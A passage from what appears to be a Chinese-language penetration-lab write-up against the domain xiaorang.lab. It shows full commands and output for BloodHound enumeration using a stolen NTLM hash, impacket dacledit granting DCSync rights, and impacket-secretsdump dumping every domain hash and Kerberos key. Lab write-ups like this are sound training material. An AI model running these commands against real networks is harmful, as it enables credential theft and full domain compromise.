class="hljs-number">45</span> <span class="hljs-number">58</span> ce <span class="hljs-number">30</span> cc <span class="hljs-number">09</span> <span class="hljs-number">49</span> b3 b8 <span class="hljs-number">09</span> b8 <span class="hljs-number">3</span>a fe <span class="hljs-number">27</span> <span class="hljs-number">1</span>f <span class="hljs-number">10</span> <span class="hljs-number">74</span> <span class="hljs-number">7</span>d <span class="hljs-number">4</span>e <span class="hljs-number">73</span> c4 af db <span class="hljs-number">39</span> <span class="hljs-number">94</span> a5 c6 <span class="hljs-number">2</span>b e3 <span class="hljs-number">22</span> <span class="hljs-number">2</span>f <span class="hljs-number">04</span> b7 <span class="hljs-number">9</span>b <span class="hljs-number">75</span> f0 <span class="hljs-number">72</span> ac b5 <span class="hljs-number">6</span>f <span class="hljs-number">21</span> d0 <span class="hljs-number">3</span>c cb <span class="hljs-number">82</span> <span class="hljs-number">0</span>f <span class="hljs-number">49</span> <span class="hljs-number">76</span> c4 <span class="hljs-number">83</span> bf df db <span class="hljs-number">0</span>f <span class="hljs-number">3</span>f <span class="hljs-number">2</span>e <span class="hljs-number">57</span><br>        ssp :<br>        credman :<br></code></pre></td></tr></table></figure><p>dump åŸŸä¿¡æ¯åˆ†æ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">proxychains -q bloodhound-python -d xiaorang.lab -u &#x27;Zhangtong&#x27; --hashes <span class="hljs-number">22</span>c7f81993e96ac83ac2f3f1903de8b4:<span class="hljs-number">22</span>c7f81993e96ac83ac2f3f1903de8b4 -dc XIAORANG-WIN16.xiaorang.lab -c all -ns <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span> --zip --dns-tcp<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/b356b2bbdac01ec4.png"></p><p>å‘ç° web çš„æœºå™¨ç”¨æˆ·æœ‰ WirteDacl æƒé™</p><p><img src="https://img.dkdun.cn/v1/2025/12/bf18f4bb6fb1db28.png"></p><p>é‚£ä¹ˆæ‰“ DCsync</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â””â”€# proxychains -q impacket-dacledit &#x27;XIAORANG.LAB&#x27;/&#x27;XIAORANG-EXC01$&#x27; -hashes bc2aaa56d33a9080b44fbe2d44b520b5:bc2aaa56d33a9080b44fbe2d44b520b5 -action write -rights DCSync -principal &#x27;XIAORANG-EXC01$&#x27; -target-dn &quot;DC=xiaorang,DC=lab&quot; -dc-ip <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span><br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">101</span>: SyntaxWarning: invalid escape sequence &#x27;\V&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">83</span>-<span class="hljs-number">0</span>&#x27;: &#x27;NT VIRTUAL MACHINE\Virtual Machines&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">110</span>: SyntaxWarning: invalid escape sequence &#x27;\P&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">554</span>&#x27;: &#x27;BUILTIN\Pre-Windows <span class="hljs-number">2000</span> Compatible Access&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">111</span>: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">555</span>&#x27;: &#x27;BUILTIN\Remote Desktop Users&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">112</span>: SyntaxWarning: invalid escape sequence &#x27;\I&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">557</span>&#x27;: &#x27;BUILTIN\Incoming Forest Trust Builders&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">114</span>: SyntaxWarning: invalid escape sequence &#x27;\P&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">558</span>&#x27;: &#x27;BUILTIN\Performance Monitor Users&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">115</span>: SyntaxWarning: invalid escape sequence &#x27;\P&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">559</span>&#x27;: &#x27;BUILTIN\Performance Log Users&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">116</span>: SyntaxWarning: invalid escape sequence &#x27;\W&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">560</span>&#x27;: &#x27;BUILTIN\Windows Authorization Access Group&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">117</span>: SyntaxWarning: invalid escape sequence &#x27;\T&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">561</span>&#x27;: &#x27;BUILTIN\Terminal Server License Servers&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">118</span>: SyntaxWarning: invalid escape sequence &#x27;\D&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">562</span>&#x27;: &#x27;BUILTIN\Distributed COM Users&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">119</span>: SyntaxWarning: invalid escape sequence &#x27;\C&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">569</span>&#x27;: &#x27;BUILTIN\Cryptographic Operators&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">120</span>: SyntaxWarning: invalid escape sequence &#x27;\E&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">573</span>&#x27;: &#x27;BUILTIN\Event Log Readers&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">121</span>: SyntaxWarning: invalid escape sequence &#x27;\C&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">574</span>&#x27;: &#x27;BUILTIN\Certificate Service DCOM Access&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">122</span>: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">575</span>&#x27;: &#x27;BUILTIN\RDS Remote Access Servers&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">123</span>: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">576</span>&#x27;: &#x27;BUILTIN\RDS Endpoint Servers&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">124</span>: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">577</span>&#x27;: &#x27;BUILTIN\RDS Management Servers&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">125</span>: SyntaxWarning: invalid escape sequence &#x27;\H&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">578</span>&#x27;: &#x27;BUILTIN\Hyper-V Administrators&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">126</span>: SyntaxWarning: invalid escape sequence &#x27;\A&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">579</span>&#x27;: &#x27;BUILTIN\Access Control Assistance Operators&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">127</span>: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">580</span>&#x27;: &#x27;BUILTIN\Remote Management Users&#x27;,<br>Impacket v0.<span class="hljs-number">12</span>.<span class="hljs-number">0</span> - Copyright Fortra, LLC and its affiliated companies<br><br>[*] DACL backed up to dacledit-<span class="hljs-number">20250907</span>-<span class="hljs-number">171134</span>.bak<br>[*] DACL modified successfully!<br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥ dump ä¸‹æ¥åŸŸå†…æ‰€æœ‰å“ˆå¸Œ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â””â”€# proxychains -q impacket-secretsdump &#x27;XIAORANG.LAB&#x27;/&#x27;XIAORANG-EXC01$&#x27;@<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span> -hashes bc2aaa56d33a9080b44fbe2d44b520b5:bc2aaa56d33a9080b44fbe2d44b520b5<br>Impacket v0.<span class="hljs-number">12</span>.<span class="hljs-number">0</span> - Copyright Fortra, LLC and its affiliated companies<br><br>[-] RemoteOperations failed: DCERPC Runtime Error: code: <span class="hljs-number">0</span>x5 - rpc_s_access_denied<br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>xiaorang.lab\Administrator:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">7</span>acbc09a6c0efd81bfa7d5a1d4238beb:::<br><span class="hljs-function">Guest:501:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">krbtgt</span>:502:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647</span>:::</span><br><span class="hljs-function"><span class="hljs-title">DefaultAccount</span>:503:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\$431000-7<span class="hljs-title">AGO1IPPEUGJ</span>:1124:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_46bc0bcd781047eba</span>:1125:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_2554056e362e45ba9</span>:1126:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_ae8e35b0ca3e41718</span>:1127:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_341e33a8ba4d46c19</span>:1128:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_3d52038e2394452f8</span>:1129:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_2ddd7a0d26c84e7cb</span>:1130:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_015b052ab8324b3fa</span>:1131:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_9bd6f16aa25343e68</span>:1132:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_68af2c4169b54d459</span>:1133:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox8446c5b</span>:1135:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:00<span class="hljs-title">d8a86839e3a99044a6bd793102dc31</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox0d5918e</span>:1136:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:f6eef9918e591ca09c721976db49a5d4</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxeda7a84</span>:1137:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:1<span class="hljs-title">e89e23e265bb7b54dc87938b1b1a131</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox33b01cf</span>:1138:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:0<span class="hljs-title">eff3de35019c2ee10b68f48941ac50d</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox9570292</span>:1139:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox3479a75</span>:1140:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox2d45c5b</span>:1141:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:4822<span class="hljs-title">b67394d6d93980f8e681c452be21</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxec2d542</span>:1142:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:147734<span class="hljs-title">fa059848c67553dc663782e899</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxf5f7dbd</span>:1143:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox67dc103</span>:1144:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:4<span class="hljs-title">fe68d094e3e797cfc4097e5cca772eb</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox320fc73</span>:1145:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:0<span class="hljs-title">c3d5e9fa0b8e7a830fcf5acaebe2102</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">Lumia</span>:1146:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:862976<span class="hljs-title">f8b23c13529c2fb1428e710296</span>:::</span><br><span class="hljs-function"><span class="hljs-title">Zhangtong</span>:1147:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:22<span class="hljs-title">c7f81993e96ac83ac2f3f1903de8b4</span>:::</span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">WIN16</span>$:1000:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:9<span class="hljs-title">b7e332d6adcb4d62cae212d0c8038b8</span>:::</span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">EXC01</span>$:1103:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:bc2aaa56d33a9080b44fbe2d44b520b5</span>:::</span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">PC</span>$:1104:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:6<span class="hljs-title">e136574f98f5d76aa1d5557e71b2edd</span>:::</span><br><span class="hljs-function">[*] <span class="hljs-title">Kerberos</span> <span class="hljs-title">keys</span> <span class="hljs-title">grabbed</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">Administrator:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">d35b5e1dedca8060e674610041c5095c853724ca50c986c909a955b15fadf630</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">Administrator:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:8<span class="hljs-title">b17084cfa8d1c1d37c13201d68ec0cf</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">Administrator:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5:d9c4a4d5348f0d73</span></span><br><span class="hljs-function"><span class="hljs-title">krbtgt:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:951<span class="hljs-title">d91f55df01d8e3013f433c695fd9684ac2f9f5c08fa815f751c894ca749f9</span></span><br><span class="hljs-function"><span class="hljs-title">krbtgt:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:7<span class="hljs-title">aa1c6c1f4080fdbf150cf5b6385c480</span></span><br><span class="hljs-function"><span class="hljs-title">krbtgt:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:700<span class="hljs-title">d434046231a9e</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox8446c5b:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">e34d601b6af9400b61602b8c9f71686f0393a97168db256adda27558816c4112</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox8446c5b:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:34<span class="hljs-title">f030ea99be5779376807998952ee81</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox8446c5b:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:4675<span class="hljs-title">ef8c15862329</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox0d5918e:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">dc5bb8f5cebfb09275e74f1fbb80a7eae044a064202a5b291aa09700909cabb5</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox0d5918e:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">fa2569ff74ac4ef0145b684535b9db26</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox0d5918e:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5:b05ed989c78304fb</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxeda7a84:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:0<span class="hljs-title">dfb6bdfa6f3592f55baf1c228686597e00b1361eca1441a1fdf0c3599507fd7</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxeda7a84:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">f20b096f3ad270e4c36876fd0f1f4a09</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxeda7a84:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:3458<span class="hljs-title">ec32a815ce0b</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox33b01cf:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:801<span class="hljs-title">e2feead7ae5074578fad5eac0d3dabd92f0445068e0a69232ce5bd8ca76f4</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox33b01cf:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:3136<span class="hljs-title">e1be7138a8d29fa10bc3f2cf6f99</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox33b01cf:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:3283<span class="hljs-title">a2dc518680f7</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox9570292:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">f3aba1d52f3131e46d916fbd04817b43281b76b86b56dad24f808538e91363cc</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox9570292:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">ee9802236d43d7e5695190232c044d63</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox9570292:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:37<span class="hljs-title">d30719e940d679</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox3479a75:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:721<span class="hljs-title">d8bcbbe316a0ec1a7f0aa3ce3519b4d7c3281a571e900b41384e5583d2c84</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox3479a75:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:18353920<span class="hljs-title">e23e46ef0a834fe5cd5a481b</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox3479a75:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:8<span class="hljs-title">a3d2cf261386ba8</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox2d45c5b:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">ff6aac30c110e42185c90561d0befebb0b462553737d05aec9c6dcb660612ffd</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox2d45c5b:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:5117<span class="hljs-title">b1a04caa9925f508eeb0bd6ffa35</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox2d45c5b:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5:df2ca48c1525dccb</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxec2d542:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">a63a5cb34f7d503c61af2a96508ed826b0ad4daf10198f2b709b75bc58789e90</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxec2d542:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">bfe7ece929174b6ba1d643e87f37cf7a</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxec2d542:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:5<span class="hljs-title">bf42601e608df31</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxf5f7dbd:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:824<span class="hljs-title">ea1eadc05dc8b0ed26c3ff0696c9e2fc145ad2d08dd5dbb1c6428f4eb074f</span></span><br><span 